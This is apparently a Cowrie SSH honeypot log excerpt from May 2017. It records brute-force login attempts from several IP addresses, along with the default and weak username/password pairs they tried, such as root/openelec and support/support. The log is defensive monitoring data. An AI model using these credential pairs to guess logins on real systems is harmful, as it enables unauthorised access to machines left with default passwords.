+2017-05-27T01:00:54+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133951,171.76.127.251] login return, expect: [root/openelec]
+2017-05-27T01:00:55+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133951,171.76.127.251] login attempt [usuario/usuario] failed
+2017-05-27T01:00:55+0000 [-] 'root' failed auth 'password'
+2017-05-27T01:00:55+0000 [-] unauthorized login: 
+2017-05-27T01:00:55+0000 [-] 'root' failed auth 'password'
+2017-05-27T01:00:55+0000 [-] unauthorized login: 
+2017-05-27T01:00:55+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 212.129.58.61:59761 (10.8.41.81:2222) [session: 587da34f]
+2017-05-27T01:00:55+0000 [HoneyPotSSHTransport,133956,212.129.58.61] connection lost
+2017-05-27T01:00:55+0000 [HoneyPotSSHTransport,133956,212.129.58.61] Connection lost after 0 seconds
+2017-05-27T01:00:55+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] 'root' trying auth 'password'
+2017-05-27T01:00:56+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login attempt: 22365
+2017-05-27T01:00:56+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login return, expect: [support/support]
+2017-05-27T01:00:57+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login attempt [root/openelec] failed
+2017-05-27T01:00:57+0000 [-] 'usuario' failed auth 'password'
+2017-05-27T01:00:57+0000 [-] unauthorized login: 
+2017-05-27T01:00:57+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133954,171.76.127.251] 'root' trying auth 'password'
+2017-05-27T01:00:57+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133954,171.76.127.251] login attempt: 13
+2017-05-27T01:00:57+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133954,171.76.127.251] login return, expect: [root/openelec]
+2017-05-27T01:00:59+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133954,171.76.127.251] login attempt [root/welc0me] failed
+2017-05-27T01:00:59+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133952,171.76.127.251] 'root' trying auth 'password'
+2017-05-27T01:00:59+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133952,171.76.127.251] login attempt: 14
+2017-05-27T01:00:59+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133952,171.76.127.251] login return, expect: [root/openelec]
+2017-05-27T01:01:01+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133952,171.76.127.251] login attempt [root/password] failed
+2017-05-27T01:01:01+0000 [HoneyPotSSHTransport,133955,171.76.127.251] NEW KEYS
+2017-05-27T01:01:01+0000 [HoneyPotSSHTransport,133955,171.76.127.251] starting service 'ssh-userauth'
+2017-05-27T01:01:01+0000 [-] 'root' failed auth 'password'
+2017-05-27T01:01:01+0000 [-] unauthorized login: 
+2017-05-27T01:01:01+0000 [-] 'root' failed auth 'password'
+2017-05-27T01:01:01+0000 [-] unauthorized login: 
+2017-05-27T01:01:01+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] 'root' trying auth 'password'
+2017-05-27T01:01:01+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login attempt: 22366
+2017-05-27T01:01:01+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login return, expect: [support/support]
